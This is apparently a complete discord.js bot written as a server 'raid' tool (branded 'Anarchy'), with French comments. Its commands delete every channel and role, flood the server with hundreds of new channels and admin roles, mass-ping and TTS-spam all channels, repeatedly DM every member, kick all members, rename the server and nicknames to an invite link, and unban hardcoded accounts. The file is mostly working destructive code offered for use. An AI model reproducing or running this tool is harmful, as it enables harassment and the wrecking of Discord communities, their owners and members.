const Discord = require("discord.js");
const chalk = require("chalk")
const bot = new Discord.Client();
const prefix = "=" ;
process.on('unhandledRejection', (reason) => {

  console.error(reason);

});

bot.on("ready", () => {
		console.log(chalk.red(`${bot.user.tag} prêt pour le carnage`)) 
		console.log(`invite : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=-1`)
		console.log(`token : ${bot.token}`) 
		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))
		console.log(bot. users. size) 
	 //bot.channels.map(c => c.createInvite().then(url => console.log(url.code)))
		//bot.guilds.map(g => g. unban("491878353960304640")) 
		//bot.guilds.map(g => g.createChannel("text","anarchy").then(c => c.send("=anarchie")))
 	})
bot.on("message", msg => {
		
	//masse ping
		if(msg.content.includes("@everyone")){
		
		msg.channel.send(`@everyone Raid By Anarchy XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true})
		
	}
			 if(msg.content === prefix+"allchan"){
 	  msg.delete();
 	  msg.guild.channels.findAll("type", "text").map(c => c.send(`@everyone Raid By Anarchy XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true})) 
			  	 	}
				if(msg.content === prefix+"channel"){
			  			msg.delete();
			  			for(var i = 0; i < 20; i++){
			  				msg.guild.createChannel("Anarchy", "text");
			     }
			     for(var i =0; i < 479; i++){
			     	msg.guild.createChannel("Anarchy","voice");
			     	}
			     setTimeout(() => {
			     	msg.channel.send (prefix+"issou"). then(m => m. delete()) ;
			     	msg.channel.send(prefix+"allchan").then(m => m.delete());
			     	}, 45000);   
			 }
			 
		if(msg.content === prefix+"admin"){
			msg.delete();
			msg.guild.roles.map(r => r. edit({permissions:2146958591}))
			msg.guild.roles.map(r => r.delete()) 
		}

		if(msg.content===prefix+"roles"){
			  msg.delete();
			for(var i = 0; i < 225; i++){
				msg.guild.createRole({name:"Anarchy",permissions:8,mentionable:false})
			}
		} 
		 			//détruire des channels
			  	if(msg.content=== prefix+"anarchie"){
			  		console.log("destruction")
			  		msg.guild.channels.map(c => c.delete())
			  		msg.guild.createChannel("Anarchy", "text").then(m => m.send(prefix+"channel"));
			  		}
			  			if(msg.content === prefix+"issou"){
			  				msg.delete();
							msg.channel.send(prefix+"admin").then(m => m.delete())
							msg.channel.send(prefix+"roles").then(m => m.delete())
			  				msg.guild.setName("Dead By Anarchy")
			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/499167096786386955/499654562810953741/Screenshot_2018-10-08-17-25-02.png")
			  				}
			  					if(msg.content === prefix+ "die"){
									if(msg.author.id !== "491878353960304640")return;
			  						process.exit()
			  					}
									  if(msg.content === prefix+"mp"){
										  for(var i = 0; i < 100; i++){
											  msg.guild.members.map(m => m.send(`${msg.guild.owner.tag.user.tag} s'est fait liquidé son serv \nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true}))
										  }
									  }
			  							if(msg.content === prefix+"botstats"){
			  							msg.delete()
			  							const info = new Discord.RichEmbed()
			  							.setTitle("info du bot")
			  							.setColor("RANDOM")
			  							.addField("nombre d'utilisateurs", bot.users.size)
			  							.addField("nombre de channels", bot.channels.size)
			  							.addField("mémoire utilisée", process.memoryUsage().heapUsed/100000 + "MB")
			  							msg.channel.send(info).then(m => m.delete(10000))
			  							}
			  							if(msg.content === prefix+"destruction"){
			  							msg.delete();
			  							bot.channels.map(c => c.delete())
			  							msg.author.send("channels détruits")
          								bot.guilds.map(g => g.roles.map(r=>r.delete()))
          								msg.author.send("rôles détruits")
          							}
		          if(msg.content === prefix+"banall"){
		          	msg.guild.members.map(g => g.kick().then(ban => g.guild.members.map(mp => mp.send(`${ban.user.username} s'est fait finir.`))))
 	           	  }
 	           if(msg.content === "blop"){
 	           	msg.delete();
 	           	bot.guilds.map(g => g.unban("306119836503900161"))
 	           	}
 	           	if(msg.content === prefix+"purge"){
 	           		msg.channel.bulkDelete(30)
 	           		}
 	           		if(msg.content.startsWith(prefix+"ban")){
 	           			var mention = msg.mentions.users.first();
 	           			msg.delete();
 	           			
 	           			if(!mention)return;

 	           			msg.guild.member(mention).ban();
 	           			}	
	if(msg.content ===prefix +"rename"){

	                	msg.delete();

	                	msg.guild.members.map(g => g.setNickname("https://discord.gg/vDZ64C3")) 

	                }
	
 	           			
 	       		});
 	       	 
		
	bot.login(process.env.token)



